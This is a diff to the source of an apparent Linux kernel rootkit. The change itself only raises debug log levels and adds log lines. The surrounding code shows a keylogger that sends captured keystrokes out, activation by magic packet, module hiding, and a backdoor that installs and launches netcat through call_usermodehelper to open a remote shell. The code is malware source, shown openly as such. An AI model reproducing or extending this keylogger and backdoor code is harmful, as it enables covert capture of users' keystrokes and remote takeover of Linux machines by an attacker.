@@ -114,7 +114,7 @@ static const char* keymap_shift[] =
 			const char *key = !shift_pressed ? keymap[param->value] : keymap_shift[param->value];
 
 			#ifdef LOG
-			if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down  %s\n", param->value, key);
+			if (code == KBD_KEYCODE && param->down) printk(KERN_ERR  "KEYLOGGER %i down  %s\n", param->value, key);
 			#endif
 
 			send_pressed_keys(key);
@@ -139,15 +139,15 @@ static const char* keymap_shift[] =
 
 	    int ret = call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); // Remove all netcat version
 	    #ifdef LOG
-			printk(KERN_DEBUG "BACKDOOR un-install netcat returned  %i\n", ret);
+			printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
 		#endif
 	    ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
 	    #ifdef LOG
-			printk(KERN_DEBUG "BACKDOOR install netcat returned  %i\n", ret);
+			printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
 		#endif
 	    ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
 	    #ifdef LOG
-			printk(KERN_DEBUG "BACKDOOR run netcat returned  %i\n", ret);
+			printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
 		#endif
 	}
 
@@ -163,11 +163,14 @@ static const char* keymap_shift[] =
 				
 		    		keylogger_active = 1;
 				#ifdef LOG
-					printk(KERN_DEBUG "KEYLOGGER ACTIVATION PACKAGE!");
+					printk(KERN_ERR  "KEYLOGGER ACTIVATION PACKAGE!");
 				#endif
 				break;
 			case KEYLOGGER_DEACTIVATION_CODE :
 				keylogger_active = 0;
+				#ifdef LOG
+					printk(KERN_ERR  "KEYLOGGER DE-ACTIVATION PACKAGE!");
+				#endif
 				break;
 			case HIDEMODULE_ACTIVATION_CODE :
 				hide_module();
@@ -177,6 +180,9 @@ static const char* keymap_shift[] =
 				break;
 			case BACKDOOR_ACTIVATION_CODE :
 				start_remote_shell();
+				#ifdef LOG
+					printk(KERN_ERR  "BACKDOOR ACTIVATION PACKAGE!");
+				#endif
 				break;
 		}    
 	}
